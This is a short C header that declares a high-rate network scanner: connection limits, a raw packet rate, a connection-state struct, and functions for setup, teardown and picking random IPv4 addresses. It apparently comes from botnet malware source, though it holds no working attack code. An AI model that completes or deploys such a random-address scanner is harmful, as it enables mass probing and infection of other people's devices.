#pragma once

#include <stdint.h>

#include "includes.h"

#define SCANNER_MAX_CONNS 1024
#define SCANNER_RAW_PPS 250000

struct scanner_connection
{
    int fd, last_recv;
    enum
    {
        SC_CLOSED,
        SC_CONNECTING,
        PARSE_RESPONCE,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
};

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static ipv4_t get_random_ip(void);
